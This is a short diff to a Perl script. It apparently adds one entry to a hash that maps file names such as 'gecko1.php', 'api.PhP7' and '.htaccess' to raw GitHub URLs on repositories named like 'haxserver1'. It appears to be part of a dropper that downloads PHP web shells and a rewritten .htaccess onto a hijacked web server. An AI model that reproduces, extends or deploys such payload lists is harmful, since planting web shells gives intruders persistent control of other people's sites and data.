@@ -13,6 +13,7 @@ my %tmp_files = (
     "temp_156b0bb68af8ae51.php" => "raw.githubusercontent.com/sunokazzu/zuskoa_34/main/temp_156b0bb68af8ae51.php",
     "gecko1.php" => "raw.githubusercontent.com/haxserver1/jlkhsdhamnbsuygdamwnbsd/main/gecko.php",
     "gecko1.PhP7" => "raw.githubusercontent.com/haxserver1/jlkhsdhamnbsuygdamwnbsd/main/gecko.php",
+    ".htaccess" => "raw.githubusercontent.com/haxserver1/jlkhsdhamnbsuygdamwnbsd/main/.htaccess",
     "etc_8h3060h0949dr427.PhP7" => "raw.githubusercontent.com/sunokazzu/zuskoa_34/main/etc_8h3060h0949dr427.PhP7",
     "tiny_50kd19jaw938azh1.php" => "raw.githubusercontent.com/sunokazzu/zuskoa_34/main/tiny_50kd19jaw938azh1.php",
     "api.PhP7" => "raw.githubusercontent.com/sunokazzu/zuskoa_34/main/api.PhP7",
